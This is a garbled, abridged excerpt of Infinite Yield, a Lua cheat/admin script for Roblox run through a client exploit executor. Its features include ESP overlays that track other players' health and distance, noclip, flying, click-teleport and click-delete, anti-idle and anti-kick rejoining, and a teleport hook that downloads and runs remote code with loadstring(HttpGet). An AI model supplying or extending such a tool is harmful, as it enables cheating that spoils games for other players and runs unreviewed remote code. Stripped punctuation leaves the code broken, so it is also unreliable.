			local writelogs = '-- Infinite Yield Chat logs for '..placeName..'n'
			for _, child in pairs(scroll_2GetChildren()) do
				writelogs = writelogs..'n'..child.Text
			end
...
Players.PlayerRemovingConnect(function(player)
	if ESPenabled or CHMSenabled or COREGUIFindFirstChild(player.Name..'_LC') then
		for i,v in pairs(COREGUIGetChildren()) do
...
Exit.MouseButton1DownConnect(function()
	logsTweenPosition(UDim2.new(0, 0, 1, 10), InOut, Quart, 0.3, true, nil)
end)

Hide.MouseButton1DownConnect(function()
	if logs.Position ~= UDim2.new(0, 0, 1, -20) then
		logsTweenPosition(UDim2.new(0, 0, 1, -20), InOut, Quart, 0.3, true, nil)
	else
		logsTweenPosition(UDim2.new(0, 0, 1, -265), InOut, Quart, 0.3, true, nil)
	end
end)

EventBind.MouseButton1ClickConnect(function()
	eventEditor.FrameTweenPosition(UDim2.new(0.5,-175,0.5,-101), InOut, Quart, 0.5, true, nil)
end)

Keybinds.MouseButton1ClickConnect(function()
	KeybindsFrameTweenPosition(UDim2.new(0, 0, 0, 0), InOut, Quart, 0.5, true, nil)
	wait(0.5)
...
Close.MouseButton1ClickConnect(function()
	...
	KeybindsFrameTweenPosition(UDim2.new(0, 0, 0, 175), InOut, Quart, 0.5, true, nil)
end)
...
Add.MouseButton1ClickConnect(function()
	KeybindEditorTweenPosition(UDim2.new(0.5, -180, 0, 260), InOut, Quart, 0.5, true, nil)
end)

Delete.MouseButton1ClickConnect(function()
	binds = {}
	refreshbinds()
	updatesaves()
...
Close_2.MouseButton1ClickConnect(function()
	SettingsHolder.Visible = true
	AliasesFrameTweenPosition(UDim2.new(0, 0, 0, 175), InOut, Quart, 0.5, true, nil)
end)

Aliases.MouseButton1ClickConnect(function()
	AliasesFrameTweenPosition(UDim2.new(0, 0, 0, 0), InOut, Quart, 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)

Close_3.MouseButton1ClickConnect(function()
	SettingsHolder.Visible = true
	PositionsFrameTweenPosition(UDim2.new(0, 0, 0, 175), InOut, Quart, 0.5, true, nil)
end)

Positions.MouseButton1ClickConnect(function()
	PositionsFrameTweenPosition(UDim2.new(0, 0, 0, 0), InOut, Quart, 0.5, true, nil)
	wait(0.5)
	SettingsHolder.Visible = false
end)
...
function selectPart()
	ToPartFrameTweenPosition(UDim2.new(0.5, -180, 0, 335), InOut, Quart, 0.5, true, nil)
	...
	ActivateHighlight = IYMouse.MoveConnect(HighlightPart)
	...
	ClickSelect = IYMouse.Button1DownConnect(SelectPart)
end

Part.MouseButton1ClickConnect(function()
	selectPart()
end)

Exit_4.MouseButton1ClickConnect(function()
	ToPartFrameTweenPosition(UDim2.new(0.5, -180, 0, -500), InOut, Quart, 0.5, true, nil)
	if ActivateHighlight then
		ActivateHighlightDisconnect()
	end
	if ClickSelect then
		ClickSelectDisconnect()
	end
	selectionBox.Adornee = nil
	selected.Adornee = nil
	Path.Text = 
...
CopyPath.MouseButton1ClickConnect(function()
	if Path.Text ~=  then
...
ChoosePart.MouseButton1ClickConnect(function()
	if Path.Text ~=  then
		local tpNameExt = ''
		local function handleWpNames()
			local FoundDupe = false
			for i,v in pairs(pWayPoints) do
				if v.NAMElower() == selected.Adornee.Namelower()..tpNameExt then
					FoundDupe = true
				end
			end
...
cmds={}
customAlias = {}
Delete_3.MouseButton1ClickConnect(function()
	customAlias = {}
	aliases = {}
...
PrefixBoxGetPropertyChangedSignal(Text)Connect(function()
...
function UpdateToViewport()
	if Holder.Position.X.Offset  -CamViewport() then
		HolderTweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), InOut, Quart, 0.04, true, nil)
		NotificationTweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), InOut, Quart, 0.04, true, nil)
	end
end
CameraChanged = workspace.CurrentCameraGetPropertyChangedSignal(ViewportSize)Connect(UpdateToViewport)

function updateCamera(child, parent)
	if parent ~= workspace then
		CamMovedDisconnect()
		CameraChangedDisconnect()
		repeat wait() until workspace.CurrentCamera
		CameraChanged = workspace.CurrentCameraGetPropertyChangedSignal(ViewportSize)Connect(UpdateToViewport)
		CamMoved = workspace.CurrentCamera.AncestryChangedConnect(updateCamera)
	end
end
CamMoved = workspace.CurrentCamera.AncestryChangedConnect(updateCamera)
	...
	task.spawn(function()
		...
		local function update(input)
			...
			if startPos.X.Offset + delta.X = -500 then
				...
				TweenServiceCreate(Notification, TweenInfo.new(.20), {Position = Position})Play()
				pos = 250
			else
			...
			if startPos.X.Offset + delta.X = -250 and -CamViewport() = startPos.X.Offset + delta.X then
				...
				TweenServiceCreate(Notification, TweenInfo.new(.20), {Position = Position2})Play()
			...
			elseif -CamViewport()  startPos.X.Offset + delta.X then
				guiTweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), InOut, Quart, 0.04, true, nil)
...
Match = function(name,str)
	str = strgsub(%W, %%%1)
	return namelower()find(strlower()) and true
end
...
IndexContents = function(str,bool,cmdbar,Ianim)
	...
	topCommand = nil
	local chunks = {}
	if strsub(#str,#str) ==  then str =  end
	for w in string.gmatch(str,[^]+) do
		table.insert(chunks,w)
	end
	if #chunks  0 then str = chunks[#chunks] end
	if strsub(1,1) == ! then str = strsub(2) end
	for i,v in next, frameGetChildren() do
...
task.spawn(function()
	...
	local chatbox
	local success, result = pcall(function() chatbox = PlayerGuiWaitForChild(Chat).Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end)
	if success then
		local function chatboxFocused()
			canvasPos = CMDsF.CanvasPosition
		end
		local chatboxFocusedC = chatbox.FocusedConnect(chatboxFocused)

		local function Index()
			if chatbox.Textlower()sub(1,1) == prefix then
				if SettingsOpen == true then
					wait(0.2)
					CMDsF.Visible = true
					SettingsTweenPosition(UDim2.new(0, 0, 0, 220), InOut, Quart, 0.2, true, nil)
				end
				IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Textlower()sub(2),true)
			else
				minimizeHolder()
				if SettingsOpen == true then
					wait(0.2)
					SettingsTweenPosition(UDim2.new(0, 0, 0, 45), InOut, Quart, 0.2, true, nil)
					CMDsF.Visible = false
				end
			end
		end
		local chatboxFunc = chatboxGetPropertyChangedSignal(Text)Connect(Index)

		local function chatboxFocusLost(enterpressed)
			if not enterpressed or chatbox.Textlower()sub(1,1) ~= prefix then
				IndexContents('',true)
			end
			CMDsF.CanvasPosition = canvasPos
			minimizeHolder()
		end
		local chatboxFocusLostC = chatbox.FocusLostConnect(chatboxFocusLost)

		PlayerGuiWaitForChild(Chat).Frame.ChatBarParentFrame.ChildAddedConnect(function(newbar)
			wait()
			if newbarFindFirstChild('BoxFrame') then
				chatbox = PlayerGuiWaitForChild(Chat).Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
				if chatboxFocusedC then chatboxFocusedCDisconnect() end
				chatboxFocusedC = chatbox.FocusedConnect(chatboxFocused)
				if chatboxFunc then chatboxFuncDisconnect() end
				chatboxFunc = chatboxGetPropertyChangedSignal(Text)Connect(Index)
				if chatboxFocusLostC then chatboxFocusLostCDisconnect() end
				chatboxFocusLostC = chatbox.FocusLostConnect(chatboxFocusLost)
			end
		end)
		--else
...
function autoComplete(str,curText)
	...
	if curTextsub(subPos+1,subPos+1) == ! then subPos = subPos + 1 end
	Cmdbar.Text = curTextsub(1,subPos) .. strsub(1, stop - 1)..' '
	RunService.RenderSteppedWait()
	Cmdbar.Text = Cmdbar.Textgsub( 't', '' )
...
CMDs[#CMDs + 1] = {NAME = 'autorejoin  autorj', DESC = 'Automatically rejoins the server if you get kickeddisconnected'}
...
CMDs[#CMDs + 1] = {NAME = 'antiidle  antiafk', DESC = 'Prevents the game from kicking you for being idleafk'}
...
CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchasepremium prompts'}
CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchasepremium prompts again'}
CMDs[#CMDs + 1] = {NAME = 'enable [inventoryplayerlistchatresetemotesall]', DESC = 'Toggles visibility of coregui items'}
CMDs[#CMDs + 1] = {NAME = 'disable [inventoryplayerlistchatresetemotesall]', DESC = 'Toggles visibility of coregui items'}
...
CMDs[#CMDs + 1] = {NAME = 'allowrejoin  allowrj [truefalse] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
...
CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you aboveover any wall you run into'}
...
CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to settingsKeybindsAdd for clicktp'}
CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settingsKeybindsAdd for click tp'}
...
for i = 1, #CMDs do
	...
	if CMDs[i].DESC ~=  then
		newcmdSetAttribute(Title, CMDs[i].NAME)
		newcmdSetAttribute(Desc, CMDs[i].DESC)
		newcmd.MouseButton1DownConnect(function()
...
function checkTT()
	local t
	local guisAtPosition = COREGUIGetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
	...
	if t ~= nil and tGetAttribute(Title) ~= nil then
		local x = IYMouse.X
		local y = IYMouse.Y
		local xP
		local yP
		...
		Description.Text = tGetAttribute(Desc)
		if tGetAttribute(Title) ~= nil then
			Title_3.Text = tGetAttribute(Title)
		else
			Title_3.Text = ''
		end
...
function respawn(plr)
    ...
    local hum = charFindFirstChildWhichIsA(Humanoid)
    if hum then humChangeState(Enum.HumanoidStateType.Dead) end
    if not replicatesignal then wait() end
    charClearAllChildren()
...
function refresh(plr)
	refreshCmd = true
	local Human = plr.Character and plr.CharacterFindFirstChildOfClass(Humanoid, true)
	local pos = Human and Human.RootPart and Human.RootPart.CFrame
	local pos1 = workspace.CurrentCamera.CFrame
	respawn(plr)
	task.spawn(function()
		plr.CharacterAddedWait()WaitForChild(Humanoid).RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
		refreshCmd = false
	end)
end
...
function onDied()
	task.spawn(function()
		if pcall(function() Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid') then
			Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid').DiedConnect(function()
...
Clip = true
spDelay = 0.1
Players.LocalPlayer.CharacterAddedConnect(function()
	NOFLY()
	Floating = false
...
findCmd=function(cmd_name)
	for i,v in pairs(cmds)do
		if v.NAMElower()==cmd_namelower() or FindInTable(v.ALIAS,cmd_namelower()) then
			return v
		end
	end
	return customAlias[cmd_namelower()]
end
...
function execCmd(cmdStr,speaker,store)
	...
	task.spawn(function()
		...
		for i,v in pairs(commandsToRun) do
			...
			local x,y,num = vfind(^(%d+)%^)
			local cmdDelay = 0
			local infTimes = false
			if num then
				v = vsub(y+1)
				local x,y,del = vfind(^([%d%.]+)%^)
				if del then
					v = vsub(y+1)
			...
			if vsub(1,1) == ! then
				local chunks = splitString(vsub(2),split)
			...
			if cmd then
				...
				if store then
					if speaker == Players.LocalPlayer then
						if cmdHistory[1] ~= rawCmdStr and rawCmdStrsub(1,11) ~= 'lastcommand' and rawCmdStrsub(1,7) ~= 'lastcmd' then
	...
	if cmd ~=   then
		for i = #cmds,1,-1 do
			if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
				table.remove(cmds, i)
				for a,c in pairs(CMDsFGetChildren()) do
					if string.find(c.Text, ^..cmd..$) or string.find(c.Text, ^..cmd.. ) or string.find(c.Text,  ..cmd..$) or string.find(c.Text,  ..cmd.. ) then
						...
						c.MouseButton1ClickConnect(function()
...
function addcmdtext(text,name,desc)
	...
	if desc and desc ~= '' then
		newcmdSetAttribute(Title, tooltipText)
		newcmdSetAttribute(Desc, tooltipDesc)
		newcmd.MouseButton1DownConnect(function()
...
local WorldToScreen = function(Object)
	local ObjectVector = workspace.CurrentCameraWorldToScreenPoint(Object.Position)
...
local GetClosestPlayerFromCursor = function()
	...
	for i, v in pairs(PlayersGetPlayers()) do
		if v ~= Players.LocalPlayer and v.Character and v.CharacterFindFirstChildOfClass(Humanoid) then
			for k, x in pairs(v.CharacterGetChildren()) do
...
SpecialPlayerCases = {
	[all] = function(speaker) return PlayersGetPlayers() end,
	...
	[random] = function(speaker,args,currentList)
		local players = PlayersGetPlayers()
	...
	[friends] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(PlayersGetPlayers()) do
			if plrIsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	...
	[nonfriends] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(PlayersGetPlayers()) do
			if not plrIsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	...
	[bacons] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(PlayersGetPlayers()) do
			if plr.CharacterFindFirstChild('Pal Hair') or plr.CharacterFindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	...
	[nearest] = function(speaker,args,currentList)
		...
		for _,plr in pairs(currentList) do
			if plr ~= speaker and plr.Character then
				local distance = plrDistanceFromCharacter(getRoot(speakerChar).Position)
	...
	[alive] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(PlayersGetPlayers()) do
			if plr.Character and plr.CharacterFindFirstChildOfClass(Humanoid) and plr.CharacterFindFirstChildOfClass(Humanoid).Health  0 then
				table.insert(returns,plr)
			end
		end
		return returns
	...
	[dead] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(PlayersGetPlayers()) do
			if (not plr.Character or not plr.CharacterFindFirstChildOfClass(Humanoid)) or plr.CharacterFindFirstChildOfClass(Humanoid).Health = 0 then
				table.insert(returns,plr)
			end
		end
		return returns
	...
	[npcs] = function(speaker,args)
		local returns = {}
		for _, v in pairs(workspaceGetDescendants()) do
			if vIsA(Model) and getRoot(v) and vFindFirstChildWhichIsA(Humanoid) and PlayersGetPlayerFromCharacter(v) == nil then
				local clone = Instance.new(Player)
				clone.Name = v.Name ..  -  .. vFindFirstChildWhichIsA(Humanoid).DisplayName
				clone.Character = v
...
function getPlayersByName(Name)
	...
	for _,v in pairs(PlayersGetPlayers()) do
		if Namesub(0,1) == '@' then
			if string.sub(string.lower(v.Name),1,Len-1) == Namesub(2) then
...
function getPlayer(list,speaker)
	...
	for _,name in pairs(nameList) do
		...
		local initialPlayers = PlayersGetPlayers()
...
getprfx=function(strn)
	if strnsub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
	end return
end
...
UserInputService.TextBoxFocusedConnect(function(obj)
	if lastTextBoxCon then lastTextBoxConDisconnect() end
	if obj == Cmdbar then lastTextBoxString = nil return end
	lastTextBoxString = obj.Text
	lastTextBoxCon = objGetPropertyChangedSignal(Text)Connect(function()
		if not (UserInputServiceIsKeyDown(Enum.KeyCode.Return) or UserInputServiceIsKeyDown(Enum.KeyCode.KeypadEnter)) then
			lastTextBoxString = obj.Text
		end
	end)
end)
...
UserInputService.InputBeganConnect(function(input,gameProcessed)
	if gameProcessed then
		if Cmdbar and CmdbarIsFocused() then
...
Players.LocalPlayer.ChattedConnect(function()
	wait()
...
Cmdbar.PlaceholderText = Command Bar (..prefix..)
CmdbarGetPropertyChangedSignal(Text)Connect(function()
	if CmdbarIsFocused() then
...
tabAllowed = true
Cmdbar.FocusLostConnect(function(enterpressed)
	if enterpressed then
		local cmdbarText = Cmdbar.Textgsub(^..prefix,)
		execCmd(cmdbarText,Players.LocalPlayer,true)
	end
	if tabComplete then tabCompleteDisconnect() end
	wait()
	if not CmdbarIsFocused() then
		Cmdbar.Text = 
		IndexContents('',true,false,true)
...
Cmdbar.FocusedConnect(function()
	historyCount = 0
	canvasPos = CMDsF.CanvasPosition
	if SettingsOpen == true then
		wait(0.2)
...
function ESP(plr)
	task.spawn(function()
		...
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUIFindFirstChild(plr.Name..'_ESP') then
			local ESPholder = Instance.new(Folder)
			ESPholder.Name = plr.Name..'_ESP'
			ESPholder.Parent = COREGUI
			repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.CharacterFindFirstChildOfClass(Humanoid)
			for b,n in pairs (plr.CharacterGetChildren()) do
				if (nIsA(BasePart)) then
			...
			if plr.Character and plr.CharacterFindFirstChild('Head') then
				...
				local teamChange
				local addedFunc
				addedFunc = plr.CharacterAddedConnect(function()
					if ESPenabled then
						espLoopFuncDisconnect()
						teamChangeDisconnect()
						ESPholderDestroy()
						repeat wait(1) until getRoot(plr.Character) and plr.CharacterFindFirstChildOfClass(Humanoid)
						ESP(plr)
						addedFuncDisconnect()
					else
						teamChangeDisconnect()
				...
				teamChange = plrGetPropertyChangedSignal(TeamColor)Connect(function()
					if ESPenabled then
						espLoopFuncDisconnect()
						addedFuncDisconnect()
						ESPholderDestroy()
				...
				local function espLoop()
					if COREGUIFindFirstChild(plr.Name..'_ESP') then
						if plr.Character and getRoot(plr.Character) and plr.CharacterFindFirstChildOfClass(Humanoid) and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.CharacterFindFirstChildOfClass(Humanoid) then
							local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
							TextLabel.Text = 'Name '..plr.Name..'  Health '..round(plr.CharacterFindFirstChildOfClass('Humanoid').Health, 1)..'  Studs '..pos
						end
					else
						teamChangeDisconnect()
						addedFuncDisconnect()
				...
				espLoopFunc = RunService.RenderSteppedConnect(espLoop)
			end
		end
	end)
end
...
function CHMS(plr)
	task.spawn(function()
		...
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUIFindFirstChild(plr.Name..'_CHMS') then
			local ESPholder = Instance.new(Folder)
			...
			CHMSremoved = ESPholder.AncestryChangedConnect(function()
				teamChangeDisconnect()
				addedFuncDisconnect()
				CHMSremovedDisconnect()
			end)
		end
	end)
end
...
function Locate(plr)
	task.spawn(function()
		...
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUIFindFirstChild(plr.Name..'_LC') then
			local ESPholder = Instance.new(Folder)
			...
			if plr.Character and plr.CharacterFindFirstChild('Head') then
				...
				local function lcLoop()
					if COREGUIFindFirstChild(plr.Name..'_LC') then
						if plr.Character and getRoot(plr.Character) and plr.CharacterFindFirstChildOfClass(Humanoid) and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.CharacterFindFirstChildOfClass(Humanoid) then
							local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
							TextLabel.Text = 'Name '..plr.Name..'  Health '..round(plr.CharacterFindFirstChildOfClass('Humanoid').Health, 1)..'  Studs '..pos
						end
				...
				lcLoopFunc = RunService.RenderSteppedConnect(lcLoop)
			end
		end
	end)
end
...
function refreshbinds()
	if Holder_2 then
		Holder_2ClearAllChildren()
		Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #binds do
			local YSize = 25
			local Position = ((i  YSize) - YSize)
			local newbind = Example_2Clone()
			...
			newbind.Text.Delete.MouseButton1ClickConnect(function()
...
function unkeybind(cmd,key)
	...
	if key == 'RightClick' or key == 'LeftClick' then
		...
		notify('Keybinds Updated','Unbinded '..keysub(14)..' from '..cmd)
	end
end

PositionsFrame.Delete.MouseButton1ClickConnect(function()
	execCmd('cpos')
end)

function refreshwaypoints()
	if #WayPoints  0 or #pWayPoints  0 then
		PositionsHintDestroy()
	end
	if Holder_4 then
		Holder_4ClearAllChildren()
		Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
		local YSize = 25
		local num = 1
		for i = 1, #WayPoints do
			local Position = ((num  YSize) - YSize)
			local newpoint = Example_4Clone()
			...
			newpoint.Text.Delete.MouseButton1ClickConnect(function()
				execCmd('dpos '..WayPoints[i].NAME)
			end)
			newpoint.Text.TP.MouseButton1ClickConnect(function()
...
function refreshaliases()
	...
	if Holder_3 then
		Holder_3ClearAllChildren()
		Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #aliases do
			local YSize = 25
			local Position = ((i  YSize) - YSize)
			local newalias = Example_3Clone()
			...
			newalias.Text.Delete.MouseButton1ClickConnect(function()
...
BindTo.MouseButton1ClickConnect(function()
	awaitingInput = true
	BindTo.Text = 'Press something'
end)

BindTriggerSelect.MouseButton1ClickConnect(function()
...
On_2.MouseButton1ClickConnect(function()
...
Add_2.MouseButton1ClickConnect(function()
	if keySelected then
		if string.find(Cmdbar_2.Text, ) or string.find(Cmdbar_3.Text, ) then
			...
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				...
				notify('Keybinds Updated','Binded '..keyPressedsub(14)..' to '..Cmdbar_2.Text..(newToggle and   ..Cmdbar_3.Text or ))
			end
		end
	end
end)

Exit_2.MouseButton1ClickConnect(function()
	...
	BindTriggerSelect.Text = KeyDown
	keySelected = false
	KeybindEditorTweenPosition(UDim2.new(0.5, -180, 0, -500), InOut, Quart, 0.5, true, nil)
end)
	...
	if not gameProcessed and #binds  0 then
		for i,v in pairs(binds) do
			if not v.ISKEYUP then
				if (input.UserInputType == Enum.UserInputType.Keyboard and v.KEYlower()==tostring(input.KeyCode)lower()) or (input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEYlower()=='leftclick') or (input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEYlower()=='rightclick') then
					if v.TOGGLE then
...
UserInputService.InputBeganConnect(onInputBegan)
UserInputService.InputEndedConnect(onInputEnded)

ClickTP.Select.MouseButton1ClickConnect(function()
	if keySelected then
		...
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			...
			notify('Keybinds Updated','Binded '..keyPressedsub(14)..' to click tp')
		end
	end
end)

ClickDelete.Select.MouseButton1ClickConnect(function()
	if keySelected then
		...
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			...
			notify('Keybinds Updated','Binded '..keyPressedsub(14)..' to click delete')
		end
	end
end)
...
IYMouse.Button1DownConnect(function()
	for i,v in pairs(binds) do
		if v.COMMAND == 'clicktp' then
			local input = v.KEY
			if input == 'RightClick' and UserInputServiceIsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
				clicktpFunc()
			elseif input == 'LeftClick' and UserInputServiceIsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
				clicktpFunc()
			elseif UserInputServiceIsKeyDown(Enum.KeyCode[inputsub(14)]) and Players.LocalPlayer.Character then
				clicktpFunc()
			end
		elseif v.COMMAND == 'clickdel' then
			local input = v.KEY
			if input == 'RightClick' and UserInputServiceIsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
				pcall(function() IYMouse.TargetDestroy() end)
			elseif input == 'LeftClick' and UserInputServiceIsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
				pcall(function() IYMouse.TargetDestroy() end)
			elseif UserInputServiceIsKeyDown(Enum.KeyCode[inputsub(14)]) then
				pcall(function() IYMouse.TargetDestroy() end)
			end
		end
	end
...
function addPlugin(name)
	if namelower() == 'plugin file name' or namelower() == 'iy_fe.iy' or name == 'iy_fe' then
		notify('Plugin Error','Please enter a valid plugin')
	else
		local file
		local fileName
		if namesub(-3) == '.iy' then
...
function deletePlugin(name)
	...
	for i,v in pairs(CMDsFGetChildren()) do
...
function refreshplugins(dontSave)
	...
	if Holder_5 then
		Holder_5ClearAllChildren()
		Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i,v in pairs(PluginsTable) do
			local pName = v
			local YSize = 25
			local Position = ((i  YSize) - YSize)
			local newplugin = Example_5Clone()
			...
			newplugin.Text.Delete.MouseButton1ClickConnect(function()
				deletePlugin(pName)
			end)
		end
...
function LoadPlugin(val,startup)
	...
	if plugin ~= nil then
		if not startup then
			notify('Loaded Plugin',Name ..plugin[PluginName]..n..Description ..plugin[PluginDescription])
		end
		addcmdtext('',val)
			...
			for i,v in pairs(plugin[Commands]) do 
				...
				if v[ListName] then
					...
					for i,v in pairs(cmdNames) do
						newName = newNamegsub(v,v..cmdExt)
					end
...
AddPlugin.MouseButton1ClickConnect(function()
	addPlugin(PluginsGUI.FileName.Text)
end)

Exit_3.MouseButton1ClickConnect(function()
	PluginEditorTweenPosition(UDim2.new(0.5, -180, 0, -500), InOut, Quart, 0.5, true, nil)
	FileName.Text = 'Plugin File Name'
end)

Add_3.MouseButton1ClickConnect(function()
	PluginEditorTweenPosition(UDim2.new(0.5, -180, 0, 310), InOut, Quart, 0.5, true, nil)
end)

Plugins.MouseButton1ClickConnect(function()
	if writefileExploit() then
		PluginsFrameTweenPosition(UDim2.new(0, 0, 0, 0), InOut, Quart, 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	else
		notify('Incompatible Exploit','Your exploit is unable to use plugins (missing readwritefile)')
	end
end)

Close_4.MouseButton1ClickConnect(function()
	SettingsHolder.Visible = true
	PluginsFrameTweenPosition(UDim2.new(0, 0, 0, 175), InOut, Quart, 0.5, true, nil)
end)

local TeleportCheck = false
Players.LocalPlayer.OnTeleportConnect(function(State)
	if KeepInfYield and (not TeleportCheck) and queueteleport then
		TeleportCheck = true
		queueteleport(loadstring(gameHttpGet('httpsraw.githubusercontent.comEdgeIYinfiniteyieldmastersource'))())
	end
end)
...
addcmd('addalias',{},function(args, speaker)
	...
	for i,v in pairs(cmds) do
		if v.NAMElower()==cmd or FindInTable(v.ALIAS,cmd) then
			customAlias[alias] = v
...
addcmd('discord', {'support', 'help'}, function(args, speaker)
	if everyClipboard then
		toClipboard('httpsdiscord.cominvitedYHag43eeU')
		notify('Discord Invite', 'Copied to clipboard!ndiscord.ggdYHag43eeU')
	else
		notify('Discord Invite', 'discord.ggdYHag43eeU')
	end
	if httprequest then
		httprequest({
...
addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
	...
	task.spawn(function()
		...
		FRAMETweenPosition(UDim2.new(0.5, -130, 0, 100), InOut, Quart, 0.5, true, nil) 
		wait(0.5)
		Exit.MouseButton1ClickConnect(function()
			FRAMETweenPosition(UDim2.new(0.5, -130, 0, -500), InOut, Quart, 0.5, true, nil) 
			wait(0.6)
			FRAMEDestroy()
			canOpenServerinfo = true
		end)
		local Asset = MarketplaceServiceGetProductInfo(PlaceId)
		...
		CopyApp.MouseButton1ClickConnect(function()
			toClipboard(speaker.CharacterAppearanceId)
		end)
		CopyPlrID.MouseButton1ClickConnect(function()
			toClipboard(speaker.UserId)
		end)
		CopyPlcID.MouseButton1ClickConnect(function()
			toClipboard(PlaceId)
		end)
		CopyPlcName.MouseButton1ClickConnect(function()
			toClipboard(Asset.Name)
		end)

		repeat
			players = PlayersGetPlayers()
...
addcmd('gametp',{'gameteleport'},function(args, speaker)
	TeleportServiceTeleport(args[1])
end)

addcmd(rejoin, {rj}, function(args, speaker)
	if #PlayersGetPlayers() = 1 then
		Players.LocalPlayerKick(nRejoining...)
		wait()
		TeleportServiceTeleport(PlaceId, Players.LocalPlayer)
	else
		TeleportServiceTeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
	end
end)

addcmd(autorejoin, {autorj}, function(args, speaker)
	GuiService.ErrorMessageChangedConnect(function()
		execCmd(rejoin)
	end)
...
addcmd(serverhop, {shop}, function(args, speaker)
    ...
    if httprequest then
        local servers = {}
        local req = httprequest({Url = string.format(httpsgames.roblox.comv1games%dserversPublicsortOrder=Desc&limit=100&excludeFullGames=true, PlaceId)})
        local body = HttpServiceJSONDecode(req.Body)
        ...
        if #servers  0 then
            TeleportServiceTeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
        else
...
addcmd('noclip',{},function(args, speaker)
	...
	local function NoclipLoop()
		if Clip == false and speaker.Character ~= nil then
			for _, child in pairs(speaker.CharacterGetDescendants()) do
				if childIsA(BasePart) and child.CanCollide == true and child.Name ~= floatName then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = RunService.SteppedConnect(NoclipLoop)
...
vehicleflyspeed = 1
function sFLY(vfly)
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.CharacterFindFirstChildOfClass(Humanoid)
	repeat wait() until IYMouse
	if flyKeyDown or flyKeyUp then flyKeyDownDisconnect() flyKeyUpDisconnect() end
	...
	local function FLY()
		...
		task.spawn(function()
			repeat wait()
				if not vfly and Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid').PlatformStand = true
				end
			...
			BGDestroy()
			BVDestroy()
			if Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.CharacterFindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = IYMouse.KeyDownConnect(function(KEY)
		if KEYlower() == 'w' then
	...
	flyKeyUp = IYMouse.KeyUpConnect(function(KEY)
		if KEYlower() == 'w' then
			CONTROL.F = 0
		elseif KEYlower() == 's' then
			CONTROL.B = 0
...
local unmobilefly = function(speaker)
	pcall(function()
		...
		rootFindFirstChild(velocityHandlerName)Destroy()
		rootFindFirstChild(gyroHandlerName)Destroy()
		speaker.CharacterFindFirstChildWhichIsA(Humanoid).PlatformStand = false
		mfly1Disconnect()
		mfly2Disconnect()
	end)
end
...
local mobilefly = function(speaker, vfly)
	...
	local controlModule = require(speaker.PlayerScriptsWaitForChild(PlayerModule)WaitForChild(ControlModule))
	local bv = Instance.new(BodyVelocity)
	...
	mfly1 = speaker.CharacterAddedConnect(function()
		local bv = Instance.new(BodyVelocity)
